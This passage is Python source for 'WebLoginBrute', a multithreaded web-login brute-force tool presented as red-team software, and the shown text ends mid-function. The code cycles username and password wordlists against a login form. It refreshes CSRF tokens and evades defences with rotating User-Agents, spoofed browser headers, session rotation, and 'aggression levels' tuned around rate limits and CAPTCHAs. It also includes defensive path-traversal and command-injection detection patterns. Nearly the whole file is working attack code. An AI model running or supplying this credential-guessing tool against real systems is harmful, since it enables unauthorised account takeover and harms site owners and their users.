#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebLoginBrute：为红队行动设计的Web登录暴力破解工具
版本：0.0.14
作者：RedteamNotes

核心功能：
- 面向对象设计，结构清晰，易于扩展
- 支持有 CSRF Token 和无 CSRF Token 的登录目标
- 动态 CSRF Token 刷新，确保在高安全性目标上的准确性
- 多线程并发与线程安全的会话管理，支持高并发操作
- 智能重试机制与指数退避策略，提升命中率
- 多级对抗策略，可配置速率、自适应延迟
- 优雅的 Ctrl+C 退出机制，真正的会话恢复检查功能
- 完全可配置的超时、代理、输出选项
- 智能进度保存与恢复机制，避免重复爆破
- 详细统计信息与性能监控，实时反馈进度
- 强化安全防护与输入验证，防止路径遍历、命令注入
- 企业级稳定性与错误处理，包含网络、HTTP、频率限制等全方位监测
- 测试模式支持，模拟爆破而不触发实际登录
"""

import requests
import argparse
import logging
from logging.handlers import RotatingFileHandler
import time
import random
import json
import sys
import os
import http.cookiejar as cookielib
import yaml
from bs4 import BeautifulSoup, Tag
from urllib.parse import urlparse, quote
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, RLock
from itertools import product
from collections import deque
import atexit
import signal
import re
import hashlib
import ipaddress
import socket
import threading
from typing import Optional
import queue

__version__ = "0.0.14"

# 自定义异常类
class BruteForceError(Exception):
    """基础异常类"""
    pass

class ConfigurationError(BruteForceError):
    """配置错误"""
    pass

class NetworkError(BruteForceError):
    """网络错误"""
    pass

class SessionError(BruteForceError):
    """会话错误"""
    pass

class ValidationError(BruteForceError):
    """验证错误"""
    pass

class SecurityError(BruteForceError):
    """安全错误"""
    pass

class RateLimitError(BruteForceError):
    """频率限制错误"""
    pass

# 安全配置
SECURITY_CONFIG = {
    'allowed_file_extensions': ['.txt', '.json', '.yaml', '.yml', '.log', '.cookies', '.html'],
    'max_path_length': 255,
    'forbidden_paths': ['/etc', '/var', '/usr', '/bin', '/sbin', '/dev', '/proc', '/sys'],
    'max_request_rate': 100,  # 每分钟最大请求数
    'ip_whitelist': [],  # IP白名单
    'ip_blacklist': [],  # IP黑名单
}

# User-Agent列表 - 扩展更多真实浏览器
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0"
]

# 请求头模板 - 模拟真实浏览器
BROWSER_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'max-age=0'
}

class SecurityManager:
    """安全管理器"""
    
    @staticmethod
    def hash_sensitive_data(data):
        """对敏感数据进行hash处理"""
        if not data:
            return "***"
        return hashlib.sha256(data.encode('utf-8')).hexdigest()[:16]
    
    @staticmethod
    def sanitize_input(input_str):
        """清理和验证用户输入"""
        if not input_str:
            return ""
        
        # 移除危险字符
        dangerous_chars = ['<', '>', '"', "'", '&', ';', '|', '`', '$', '(', ')', '{', '}']
        for char in dangerous_chars:
            input_str = input_str.replace(char, '')
        
        # 限制长度
        if len(input_str) > 1000:
            input_str = input_str[:1000]
        
        return input_str.strip()
    
    @staticmethod
    def validate_url(url, allow_private_networks=False):
        """验证URL安全性"""
        if not url:
            return False
        
        try:
            parsed = urlparse(url)
            # 检查协议
            if parsed.scheme not in ['http', 'https']:
                return False
            
            # 检查域名 - 使用hostname而不是netloc
            if not parsed.hostname:
                return False
            
            # 检查是否为本地地址
            if parsed.hostname in ['localhost', '127.0.0.1', '::1']:
                return allow_private_networks
            
            # 检查是否为私有IP
            try:
                ip = ipaddress.ip_address(parsed.hostname)
                if ip.is_private:
                    return allow_private_networks
            except:
                pass
            
            return True
        except:
            return False
    
    @staticmethod
    def check_rate_limit(request_count, time_window=60):
        """检查请求频率限制"""
        current_time = time.time()
        # 简单的频率限制实现
        if request_count > SECURITY_CONFIG['max_request_rate']:
            return False
        return True
    
    @staticmethod
    def check_ip_whitelist(ip_address):
        """检查IP是否在白名单中"""
        if not SECURITY_CONFIG['ip_whitelist']:
            return True  # 白名单为空时允许所有IP
        return ip_address in SECURITY_CONFIG['ip_whitelist']
    
    @staticmethod
    def check_ip_blacklist(ip_address):
        """检查IP是否在黑名单中"""
        return ip_address not in SECURITY_CONFIG['ip_blacklist']
    
    @staticmethod
    def get_safe_path(filepath):
        """获取安全的文件路径，防止路径遍历攻击 - 改进版本"""
        if not filepath:
            raise SecurityError("文件路径不能为空")
        
        # 规范化路径
        normalized_path = os.path.normpath(filepath)
        
        # 检查路径长度
        if len(normalized_path) > SECURITY_CONFIG['max_path_length']:
            raise SecurityError(f"文件路径过长: {len(normalized_path)} > {SECURITY_CONFIG['max_path_length']}")
        
        # 检查符号链接
        try:
            if os.path.islink(normalized_path):
                logging.warning(f"检测到符号链接，拒绝访问: {filepath}")
                raise SecurityError(f"不允许访问符号链接: {filepath}")
        except OSError:
            # 文件不存在，继续检查
            pass
        
        # 检查绝对路径
        if os.path.isabs(normalized_path):
            # 检查是否访问系统敏感目录
            for forbidden_path in SECURITY_CONFIG['forbidden_paths']:
                if normalized_path.startswith(forbidden_path):
                    raise SecurityError(f"不允许访问系统目录: {forbidden_path}")
            
            # 确保路径在当前目录下
            current_dir = os.path.realpath(os.getcwd())
            real_path = os.path.realpath(normalized_path)
            if not real_path.startswith(current_dir):
                raise SecurityError(f"不允许访问当前目录外的文件: {filepath}")
        
        # 路径遍历检测 - 高优先级，必须检查
        path_traversal_patterns = [
            r'\.\./', r'\.\.\\', r'\.\.\\\\',
            r'\.\.\.', r'\.\.\.\.',
            r'\.\.',  # 新增：检测单独的..
        ]
        
        for pattern in path_traversal_patterns:
            if re.search(pattern, filepath, re.IGNORECASE):
                raise SecurityError(f"路径包含遍历模式: {pattern}")
        
        # 命令注入检测 - 只在特定场景下检查
        command_injection_patterns = [
            r'[;&|`$]\s*[a-zA-Z]',  # 命令分隔符后跟字母
            r'[;&|`$]\s*[a-zA-Z]',
        ]
        
        # 检查是否包含命令注入模式
        for pattern in command_injection_patterns:
            if re.search(pattern, filepath, re.IGNORECASE):
                raise SecurityError(f"路径包含命令注入模式: {pattern}")
        
        # 绝对路径命令检测 - 只在特定格式下检查
        absolute_command_patterns = [
            r'^/[a-zA-Z]*/[a-zA-Z]*/[a-zA-Z]*$',  # Unix绝对路径命令
            r'^[A-Z]:\\[a-zA-Z]*\\[a-zA-Z]*\\[a-zA-Z]*$'  # Windows绝对路径命令
        ]
        
        # 只对看起来像命令的路径进行检查
        for pattern in absolute_command_patterns:
            if re.search(pattern, filepath, re.IGNORECASE):
                raise SecurityError(f"路径包含绝对路径命令模式: {pattern}")
        
        # 检查文件扩展名
        _, ext = os.path.splitext(normalized_path)
        if ext and ext.lower() not in SECURITY_CONFIG['allowed_file_extensions']:
            raise SecurityError(f"不允许的文件扩展名: {ext}")
        
        # 新增：检查路径中的危险字符
        dangerous_chars = ['\0', '\x00', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07', 
                          '\x08', '\x09', '\x0a', '\x0b', '\x0c', '\x0d', '\x0e', '\x0f']
        for char in dangerous_chars:
            if char in filepath:
                raise SecurityError(f"路径包含危险字符: {repr(char)}")
        
        # 新增：检查路径是否为空或只包含空白字符
        if not normalized_path.strip():
            raise SecurityError("路径不能为空或只包含空白字符")
        
        return normalized_path

class WebLoginBrute:
    def __init__(self, config):
        self.config = config
        self.success = threading.Event()
        self.lock = RLock()  # 使用可重入锁提高性能
        self.form_analyzed = False
        self.executor = None
        self.progress_file = getattr(config, 'progress_file', "bruteforce_progress.json")
        # 使用deque替代set，更高效的内存管理
        self.attempted_combinations = deque(maxlen=10000)  # 限制最大长度
        self.attempted_combinations_set = set()  # 用于快速查找
        self.max_attempted_size = 10000
        
        # DNS缓存 - 避免重复解析
        self._dns_cache = {}
        self._dns_cache_lock = Lock()
        
        # 重试配置
        self.max_retries = getattr(config, 'max_retries', 3)
        self.base_delay = getattr(config, 'base_delay', 1.0)
        
        # 测试模式
        self.dry_run = getattr(config, 'dry_run', False)
        
        # 对抗级别配置
        self.aggression_level = getattr(config, 'aggression_level', 'A1')  # A0-A3
        self._setup_aggression_level()
        
        # 会话管理
        self.session_pool = {}  # 会话池，模拟不同用户
        self.session_pool_lock = Lock()  # 会话池专用锁
        self.max_session_pool_size = getattr(config, 'max_session_pool_size', 100)  # 限制会话池大小
        self.session_lifetime = getattr(self.config, 'session_lifetime', 300)  # 会话生命周期(秒)
        
        # 频率控制 - 拷贝全局配置到实例中，避免多线程竞争
        self.max_request_rate = getattr(config, 'max_request_rate', SECURITY_CONFIG['max_request_rate'])
        self.request_times = deque(maxlen=self.max_request_rate)  # 记录请求时间
        self.rate_limit_lock = Lock()  # 频率限制锁
        
        # 自适应速率控制
        self.enable_adaptive_rate_control = getattr(config, 'enable_adaptive_rate_control', False)
        self.adaptive_rate_stats = {
            'consecutive_errors': 0,
            'consecutive_successes': 0,
            'current_rate_multiplier': 1.0,
            'min_rate_multiplier': 0.1,
            'max_rate_multiplier': 2.0,
            'rate_adjustment_threshold': getattr(config, 'rate_adjustment_threshold', 5),
            'last_rate_adjustment': time.time(),
            'immediate_rate_reduction': False  # 立即降速标志
        }
        
        # 安全统计
        self.security_stats = {
            'rate_limited_requests': 0,
            'blocked_requests': 0,
            'suspicious_activities': 0
        }
        
        # 统计信息
        self.stats = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'timeout_errors': 0,
            'connection_errors': 0,
            'http_errors': 0,
            'other_errors': 0,
            'retry_attempts': 0,
            'rate_limited': 0,  # 新增：频率限制计数
            'captcha_detected': 0,  # 新增：验证码检测计数
            'start_time': None,
            'end_time': None
        }
        
        # 性能监控
        self.performance = {
            'peak_memory_usage': 0,
            'avg_response_time': 0,
            'total_response_time': 0,
            'response_count': 0,
            'last_performance_check': None,
            'memory_cleanup_count': 0  # 新增：内存清理次数
        }
        
        # 信号处理状态
        self._shutdown_requested = False
        self._shutdown_lock = Lock()
        self._cleanup_on_exit = False  # 控制是否在退出时清理进度文件
        
        # 预导入psutil以提高性能
        try:
            import psutil
            self._psutil_available = True
        except ImportError:
            self._psutil_available = False
        
        # 注册清理函数
        atexit.register(self._cleanup)
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        # IP 安全配置 - 拷贝到实例中
        self.ip_whitelist = SECURITY_CONFIG['ip_whitelist'].copy()
        self.ip_blacklist = SECURITY_CONFIG['ip_blacklist'].copy()
        
        # 内存管理
        self._last_memory_cleanup = time.time()
        self._memory_cleanup_interval = 300  # 5分钟清理一次

    def _signal_handler(self, signum, frame):
        """信号处理器，确保优雅退出 - 线程安全版本"""
        with self._shutdown_lock:
            if self._shutdown_requested:
                return  # 防止重复处理
            self._shutdown_requested = True
        
        print(f"\n[!] 收到信号 {signum}，正在优雅退出...")
        self._cleanup()
        sys.exit(0)

    def _cleanup(self):
        """资源清理函数"""
        with self._shutdown_lock:
            if not self._cleanup_on_exit and self.stats['start_time'] and not self.success.is_set():
                self._save_progress()
            
            if self._shutdown_requested:
                return # 防止重复清理
            self._shutdown_requested = True

        try:
            # 关闭线程池
            if self.executor:
                self.executor.shutdown(wait=False, cancel_futures=True)
            
            # 清理会话池
            with self.session_pool_lock:
                for username, session_info in self.session_pool.items():
                    try:
                        session_info['session'].close()
                    except Exception:
                        pass
                self.session_pool.clear()
            
            # 只有在成功登录时才清理进度文件，用户中断时保留进度
            if self._cleanup_on_exit and hasattr(self, 'progress_file') and os.path.exists(self.progress_file):
                try:
                    os.remove(self.progress_file)
                    logging.info("进度文件已清理")
                except Exception as e:
                    logging.error(f"清理进度文件失败: {e}")
            elif hasattr(self, 'progress_file') and os.path.exists(self.progress_file):
                logging.info("保留进度文件，下次可使用 --resume 参数继续")
                    
        except Exception as e:
            logging.error(f"资源清理时出错: {e}")

    def _add_attempted_combination(self, combination):
        """线程安全地添加尝试过的组合，保持 deque 和 set 同步"""
        with self.lock:
            if combination not in self.attempted_combinations_set:
                # 如果 deque 已满，移除最旧的元素
                if len(self.attempted_combinations) >= self.max_attempted_size:
                    oldest = self.attempted_combinations.popleft()
                    self.attempted_combinations_set.discard(oldest)
                
                # 添加新组合
                self.attempted_combinations.append(combination)
                self.attempted_combinations_set.add(combination)
                
                # 定期清理内存
                if len(self.attempted_combinations) % 1000 == 0:
                    self._cleanup_memory()

    def _check_rate_limit(self):
        """检查当前请求频率是否超过限制"""
        current_time = time.time()
        with self.rate_limit_lock:
            # 清理超过1分钟的记录
            while self.request_times and current_time - self.request_times[0] > 60:
                self.request_times.popleft()
            
            # 检查是否超过频率限制
            if len(self.request_times) >= self.max_request_rate:
                return False
            
            # 记录当前请求时间
            self.request_times.append(current_time)
            return True

    def _resolve_host(self, host: str, timeout: float = 5.0) -> Optional[str]:
        """解析主机名为IP地址，带缓存和超时"""
        with self._dns_cache_lock:
            if host in self._dns_cache:
                return self._dns_cache[host]
        
        try:
            # 设置socket超时
            socket.setdefaulttimeout(timeout)
            ip_str = socket.gethostbyname(host)
            
            # 缓存结果
            with self._dns_cache_lock:
                self._dns_cache[host] = ip_str
            
            logging.debug(f"DNS解析成功: {host} -> {ip_str}")
            return ip_str
        except socket.gaierror as e:
            logging.warning(f"DNS解析失败: {host} - {e}")
            # 缓存失败结果，避免重复尝试
            with self._dns_cache_lock:
                self._dns_cache[host] = None
            return None
        except socket.timeout:
            logging.warning(f"DNS解析超时: {host}")
            with self._dns_cache_lock:
                self._dns_cache[host] = None
            return None
        except Exception as e:
            logging.error(f"DNS解析异常: {host} - {e}")
            with self._dns_cache_lock:
                self._dns_cache[host] = None
            return None

    def _pre_resolve_targets(self):
        """预解析目标域名，避免运行时DNS阻塞"""
        targets = set()
        
        # 收集需要解析的域名
        for url in [self.config.form_url, self.config.submit_url]:
            if url:
                try:
                    parsed = urlparse(url)
                    if parsed.hostname:
                        targets.add(parsed.hostname)
                except Exception:
                    continue
        
        if not targets:
            return
        
        logging.info(f"预解析目标域名: {', '.join(targets)}")
        
        for host in targets:
            try:
                ip = self._resolve_host(host)
                if ip:
                    logging.info(f"目标域名解析成功: {host} -> {ip}")
                else:
                    logging.warning(f"目标域名解析失败: {host}")
            except Exception as e:
                logging.error(f"预解析域名异常: {host} - {e}")

    def _check_ip_security(self, url):
        """检查目标IP的安全性 - 支持CIDR和域名，使用DNS缓存"""
        try:
            parsed = urlparse(url)
            host = parsed.netloc.split(':')[0]
            
            # 解析IP地址
            try:
                ip = ipaddress.ip_address(host)
                ip_str = str(ip)
            except:
                # 如果不是IP地址，使用缓存的DNS解析
                ip_str = self._resolve_host(host)
                if not ip_str:
                    # 如果域名解析失败，跳过检查
                    logging.warning(f"域名解析失败，跳过IP安全检查: {host}")
                    return True
                
                try:
                    ip = ipaddress.ip_address(ip_str)
                except:
                    logging.error(f"无效的IP地址: {ip_str}")
                    return False
            
            # 检查白名单 - 支持CIDR和精确匹配
            if self.ip_whitelist:
                whitelist_match = False
                for entry in self.ip_whitelist:
                    try:
                        if '/' in entry:  # CIDR格式
                            network = ipaddress.ip_network(entry, strict=False)
                            if ip in network:
                                whitelist_match = True
                                break
                        else:  # 精确IP匹配
                            if ip_str == entry:
                                whitelist_match = True
                                break
                    except:
                        continue
                
                if not whitelist_match:
                    logging.warning(f"目标IP {ip_str} 不在白名单中")
                    return False
            
            # 检查黑名单 - 支持CIDR和精确匹配
            for entry in self.ip_blacklist:
                try:
                    if '/' in entry:  # CIDR格式
                        network = ipaddress.ip_network(entry, strict=False)
                        if ip in network:
                            logging.warning(f"目标IP {ip_str} 在黑名单网段 {entry} 中")
                            return False
                    else:  # 精确IP匹配
                        if ip_str == entry:
                            logging.warning(f"目标IP {ip_str} 在黑名单中")
                            return False
                except:
                    continue
            
            return True
        except Exception as e:
            logging.error(f"IP安全检查失败: {e}")
            return True  # 出错时允许继续

    def setup_logger(self):
        """设置日志记录器 - 性能优化版本"""
        # 创建日志目录
        log_dir = "logs"
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
        
        # 生成日志文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_file = os.path.join(log_dir, f"webloginbrute_{timestamp}.log")
        
        # 配置根日志记录器
        logger = logging.getLogger()
        logger.setLevel(logging.DEBUG)  # 设置为DEBUG以捕获所有日志
        
        # 清除现有处理器
        for handler in logger.handlers[:]:
            logger.removeHandler(handler)
        
        # 创建安全的格式化器
        class SecureFormatter(logging.Formatter):
            def format(self, record):
                # 对敏感信息进行脱敏处理
                if hasattr(record, 'msg'):
                    record.msg = self._sanitize_log_message(record.msg)
                
                # 处理record.args中的敏感信息
                if hasattr(record, 'args') and record.args:
                    sanitized_args = []
                    for arg in record.args:
                        if isinstance(arg, str):
                            sanitized_args.append(self._sanitize_log_message(arg))
                        else:
                            sanitized_args.append(arg)
                    record.args = tuple(sanitized_args)
                
                return super().format(record)
            
            def _sanitize_log_message(self, message):
                """脱敏日志消息"""
                if not isinstance(message, str):
                    return message
                
                # 脱敏用户名和密码
                patterns = [
                    (r'username[:\s]*([^\s,]+)', r'username: ***'),
                    (r'password[:\s]*([^\s,]+)', r'password: ***'),
                    (r'尝试登录[：:]\s*([^:]+):([^\s]+)', r'尝试登录: ***:***'),
                    (r'登录成功[：:]\s*([^:]+):([^\s]+)', r'登录成功: ***:***'),
                    (r'尝试\s*([^:]+):([^\s]+)', r'尝试 ***:***'),
                ]
                
                for pattern, replacement in patterns:
                    message = re.sub(pattern, replacement, message, flags=re.IGNORECASE)
                
                return message
        
        # 创建格式化器
        formatter = SecureFormatter('%(asctime)s - %(levelname)s - %(message)s')
        
        # 控制台处理器 - 只显示INFO及以上级别
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        console_handler.setFormatter(formatter)
        logger.addHandler(console_handler)
        
        # 文件处理器 - 使用RotatingFileHandler进行日志切割
        # 每个文件最大10MB，保留5个备份文件
        file_handler = RotatingFileHandler(
            log_file, 
            maxBytes=10*1024*1024,  # 10MB
            backupCount=5,
            encoding='utf-8'
        )
        file_handler.setLevel(logging.DEBUG)  # 文件记录所有级别
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)
        
        # 创建审计日志记录器
        audit_logger = logging.getLogger('audit')
        audit_logger.setLevel(logging.INFO)
        audit_logger.propagate = False  # 防止重复输出
        
        audit_file = os.path.join(log_dir, f"audit_{timestamp}.log")
        audit_handler = RotatingFileHandler(
            audit_file,
            maxBytes=5*1024*1024,  # 5MB
            backupCount=3,
            encoding='utf-8'
        )
        audit_handler.setLevel(logging.INFO)
        audit_handler.setFormatter(formatter)
        audit_logger.addHandler(audit_handler)
        
        # 记录启动信息
        logging.info(f"WebLoginBrute v{__version__} 启动")
        logging.info(f"日志文件: {log_file}")
        logging.info(f"审计日志: {audit_file}")
        
        # 性能优化：减少DEBUG日志输出频率
        if getattr(self.config, 'verbose', False):
            logging.info("详细模式已启用，将输出DEBUG级别日志")
        else:
            # 在非详细模式下，将某些DEBUG日志降级为更低的频率
            logging.debug("标准模式：关键事件记录为INFO，详细信息记录为DEBUG")

    def _setup_audit_logger(self):
        """设置独立的审计日志处理器"""
        try:
            audit_file = getattr(self.config, 'audit_file', 'security_audit.log')
            audit_logger = logging.getLogger('audit')
            audit_logger.setLevel(logging.INFO)
            audit_logger.propagate = False  # 不传播到根logger
            
            # 创建审计专用的格式化器
            audit_formatter = logging.Formatter(
                '%(asctime)s - AUDIT - %(message)s',
                datefmt='%Y-%m-%d %H:%M:%S'
            )
            
            # 审计文件处理器 - 只追加模式
            audit_handler = logging.FileHandler(audit_file, mode='a', encoding='utf-8')
            audit_handler.setLevel(logging.INFO)
            audit_handler.setFormatter(audit_formatter)
            audit_logger.addHandler(audit_handler)
            
            # 记录审计系统启动
            audit_logger.info(f"审计系统启动 - 版本 {__version__}")
            
        except Exception as e:
            logging.warning(f"设置审计日志失败: {e}")

    def load_wordlist(self, path):
        """加载字典文件 - 生成器版本，避免内存压力"""
        # 验证文件路径
        if not os.path.exists(path):
            raise ConfigurationError(f"字典文件未找到: {path}")
        
        # 检查文件大小
        file_size = os.path.getsize(path)
        max_size = getattr(self.config, 'max_file_size', 100) * 1024 * 1024  # 可配置的MB限制
        if file_size > max_size:
            raise ConfigurationError(f"字典文件过大 ({file_size / 1024 / 1024:.1f}MB)，超过限制 {max_size / 1024 / 1024}MB")
        
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                max_lines = getattr(self.config, 'max_lines', 1000000)
                for i, line in enumerate(f):
                    if i > max_lines:
                        logging.warning(f"字典文件行数过多，只读取前{max_lines}行")
                        break
                    stripped = line.strip()
                    if stripped:
                        yield stripped
        except FileNotFoundError:
            raise ConfigurationError(f"字典文件未找到: {path}")
        except Exception as e:
            raise ConfigurationError(f"加载字典失败: {e}")
    
    def load_wordlist_as_list(self, path):
        """加载字典文件为列表 - 用于小文件或需要列表的场景"""
        return list(self.load_wordlist(path))

    def contains_captcha(self, html):
        """检测页面是否包含验证码 - 安全版本"""
        if not html or not isinstance(html, str):
            return False
        
        # 使用html.parser替代lxml，避免XXE风险
        try:
            soup = BeautifulSoup(html, 'html.parser')
            return bool(soup.find('input', {'type': 'captcha'})) or 'captcha' in html.lower()
        except Exception as e:
            logging.warning(f"HTML解析失败: {e}")
            # 降级到简单的字符串匹配
            return 'captcha' in html.lower()

    def extract_token(self, response, token_field):
        """从响应中提取CSRF token - 安全版本"""
        if not token_field:
            return None
        if not response or not hasattr(response, 'text'):
            return None
        content_type = response.headers.get("Content-Type", "")
        if "application/json" in content_type:
            try:
                if not response.text.strip():
                    return None
                # 限制JSON大小，防止内存攻击
                if len(response.text) > 1024 * 1024:  # 1MB限制
                    logging.warning("JSON响应过大，跳过解析")
                    return None
                json_data = response.json()
                # 递归搜索JSON中的token字段
                return self._find_in_dict(json_data, token_field)
            except (json.JSONDecodeError, AttributeError):
                return None
        else:
            if not response.text.strip():
                return None
            # 使用安全的HTML解析器
            try:
                soup = BeautifulSoup(response.text, 'html.parser')
                token_input = soup.find('input', {'name': token_field})
                if isinstance(token_input, Tag):
                    return token_input.get('value')
            except Exception as e:
                logging.warning(f"HTML解析失败: {e}")
                return None
        return None
    
    def _find_in_dict(self, data, key):
        """递归搜索字典中的键，支持点号路径"""
        # 如果key包含点号，按路径查找
        if '.' in key:
            keys = key.split('.')
            current = data
            try:
                for k in keys:
                    if isinstance(current, dict) and k in current:
                        current = current[k]
                    else:
                        return None
                return current
            except (KeyError, TypeError):
                return None
        else:
            # 原有的递归搜索逻辑（向后兼容）
            if key in data:
                return data[key]
            for value in data.values():
                if isinstance(value, dict):
                    found = self._find_in_dict(value, key)
                    if found is not None:
                        return found
        return None

    def analyze_form_fields(self, html):
        """分析表单字段结构（仅一次）- 安全版本"""
        if self.form_analyzed:
            return

        with self.lock:
            if self.form_analyzed:
                return

            if not html or not isinstance(html, str):
                logging.warning("HTML内容无效")
                self.form_analyzed = True
                return

            # 使用安全的HTML解析器
            try:
                soup = BeautifulSoup(html, 'html.parser')
                form = soup.find('form')
                if not isinstance(form, Tag):
                    logging.warning("未检测到有效的 <form> 元素")
                    self.form_analyzed = True
                    return

                fields = {
                    inp.get('name'): inp.get('value', '') 
                    for inp in form.find_all('input') 
                    if isinstance(inp, Tag) and inp.get('name')
                }
                
                logging.info("表单字段自动探测结果：")
                for k, v in fields.items():
                    logging.info(f"  - {k} = {v}")
                self.form_analyzed = True
            except Exception as e:
                logging.warning(f"HTML解析失败: {e}")
                self.form_analyzed = True

    def _retry_with_backoff(self, func, *args, **kwargs):
        """使用指数退避策略重试函数"""
        last_exception = None
        
        for attempt in range(self.max_retries + 1):
            try:
                result = func(*args, **kwargs)
                if result is not None:
                    return result
                else:
                    raise ValueError("请求函数返回了None")
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                last_exception = e
                if attempt == self.max_retries:
                    break
                
                delay = self.base_delay * (2 ** attempt)
                logging.warning(f"网络错误，{delay:.1f}秒后重试 (尝试 {attempt + 1}/{self.max_retries + 1}): {e}")
                self.update_stats('retry_attempts')
                time.sleep(delay)
            except (requests.exceptions.HTTPError, requests.exceptions.RequestException) as e:
                # 对于HTTP错误和请求异常，不重试
                raise e
            except Exception as e:
                # 对于其他异常，记录但不重试
                logging.error(f"请求过程中发生未知错误: {e}")
                raise e
        
        if last_exception:
            raise last_exception
        else:
            raise ValueError("重试失败，没有有效的异常信息")

    def _make_request_with_retry(self, session, method, url, **kwargs):
        """带重试的请求方法"""
        def request_func():
            if method.upper() == 'GET':
                return session.get(url, **kwargs)
            elif method.upper() == 'POST':
                return session.post(url, **kwargs)
            else:
                raise ValueError(f"不支持的HTTP方法: {method}")
        
        return self._retry_with_backoff(request_func)

    def _validate_response_headers(self, response):
        """验证响应头的安全性"""
        try:
            # 检查响应头大小，防止头注入攻击
            total_header_size = sum(len(name) + len(value) for name, value in response.headers.items())
            max_header_size = 8192  # 8KB限制
            if total_header_size > max_header_size:
                logging.warning(f"响应头过大: {total_header_size} bytes > {max_header_size} bytes")
                return False
            
            # 检查可疑的响应头
            suspicious_headers = [
                'x-forwarded-for', 'x-real-ip', 'x-forwarded-host',
                'x-forwarded-proto', 'x-forwarded-port', 'x-forwarded-server'
            ]
            
            for header_name in suspicious_headers:
                if header_name in response.headers:
                    logging.warning(f"检测到可疑响应头: {header_name}")
                    return False
            
            # 检查Content-Type的安全性
            content_type = response.headers.get('content-type', '').lower()
            if 'text/html' in content_type and 'charset' in content_type:
                # 检查字符集是否安全
                if 'utf-8' not in content_type and 'ascii' not in content_type:
                    logging.warning(f"检测到不安全的字符集: {content_type}")
                    return False
            
            return True
        except Exception as e:
            logging.warning(f"响应头验证失败: {e}")
            return False

    def _get_login_page(self, session, username, password):
        """获取登录页面和Token - 安全版本"""
        start_time = time.time()
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        
        response = self._make_request_with_retry(
            session, 'GET', self.config.form_url, 
            headers=headers, timeout=self.config.timeout
        )
        response.raise_for_status()
        
        # 验证响应头安全性
        if not self._validate_response_headers(response):
            logging.warning("响应头安全检查失败")
            self.update_stats('other_errors')
            return None, None
        
        # 更新性能指标
        response_time = time.time() - start_time
        self._update_performance_metrics(response_time)

        if not self.form_analyzed:
            self.analyze_form_fields(response.text)

        if not self.config.csrf:
            # 无token场景
            return response, None
        token = self.extract_token(response, self.config.csrf)
        if not token:
            logging.warning(f"未能为 {username}:{password} 提取Token（如目标无CSRF token可忽略）")
            self.update_stats('other_errors')
            return None, None
        return response, token

    def _prepare_login_data(self, username, password, token):
        """准备登录数据"""
        data = {"username": username, "password": password}
        if self.config.csrf and token is not None:
            data[self.config.csrf] = token
        if hasattr(self.config, 'login_field') and self.config.login_field and hasattr(self.config, 'login_value'):
            data[self.config.login_field] = self.config.login_value
        return data

    def _get_token_and_detect_protection(self, session: requests.Session, username: str, password: str) -> tuple:
        """获取token和检测防护机制"""
        # 获取登录页面和最新的Token
        response, token = self._get_login_page(session, username, password)
        if not response:
            self._adjust_rate_control(success=False)  # 记录失败
            return None, None
            
        if self.config.csrf and not token:
            self._adjust_rate_control(success=False)  # 记录失败
            return None, None

        # 根据对抗级别检测防护机制
        if self.aggression_level != 'A0':  # A0模式跳过所有检测
            try:
                if self._detect_rate_limiting(response):
                    self._handle_rate_limiting(username, password)
                    self._adjust_rate_control(success=False)  # 记录失败
                    return None, None
            except RateLimitError as e:
                self._handle_rate_limiting(username, password)
                self._adjust_rate_control(success=False)  # 记录失败
                return None, None

            if self._detect_captcha(response):
                self._handle_captcha(username, password)
                self._adjust_rate_control(success=False)  # 记录失败
                return None, None

        return response, token

    def _setup_aggression_level(self):
        """设置对抗级别配置"""
        aggression_configs = {
            'A0': {  # 静默模式 - 最低对抗
                'rate_limit_detection': False,
                'captcha_detection': False,
                'adaptive_rate_control': False,
                'session_rotation': False,
                'delay_between_requests': 0.1,
                'max_concurrent_requests': 1
            },
            'A1': {  # 标准模式 - 默认
                'rate_limit_detection': True,
                'captcha_detection': True,
                'adaptive_rate_control': True,
                'session_rotation': True,
                'delay_between_requests': 0.5,
                'max_concurrent_requests': 5
            },
